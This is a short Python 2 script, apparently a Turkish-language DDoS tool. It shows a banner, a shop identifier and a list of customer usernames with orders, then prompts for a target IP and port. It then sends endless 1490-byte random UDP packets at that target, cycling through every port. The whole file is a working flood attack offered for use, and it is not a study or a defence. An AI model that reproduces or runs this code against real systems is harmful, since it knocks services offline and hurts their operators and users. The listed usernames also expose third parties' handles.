import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "     ____          _____            _   _ ___________   ___   "
print "    |  _ \   /\   |  __ \     /\   | \ | |___  /  __ \ / _ \  "
print "    | |_) | /  \  | |__) |   /  \  |  \| |  / /| |__) | | | | "
print "    |  _ < / /\ \ |  _  /   / /\ \ | . ` | / / |  _  /| | | | "
print "    | |_) / ____ \| | \ \  / ____ \| |\  |/ /__| | \ \| |_| | "
print "    |____/_/    \_\_|  \_\/_/    \_\_| \_/_____|_|  \_\\___/  "
print "    Shopier - 998bf4076dbe6c128d3e5bc6036faefe                                                          "
print "    List - Orders"
print "1_ventum|urun_1"
print "1_bartu05ak|1"
print "1_furkaan|urun_2"
print "1_furkaan|3"
print "1_ArdaErgn|urun_2"
print "1_Alper4425|urun_1"
print "1_ugur1905ugur|urun_1"
print "1_Kralsbatu2|urun_1"

print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Yukleniyor"
time.sleep(5)
print "Yukleniyor. "
time.sleep(5)
print "Yukleniyor.. "
time.sleep(5)
print "Yukleniyor... "
time.sleep(5)
print "Yukleniyor.... "
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Gonderilen Paket Sayisi: %s , Gonderilen IP: %s , Gonderilen Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
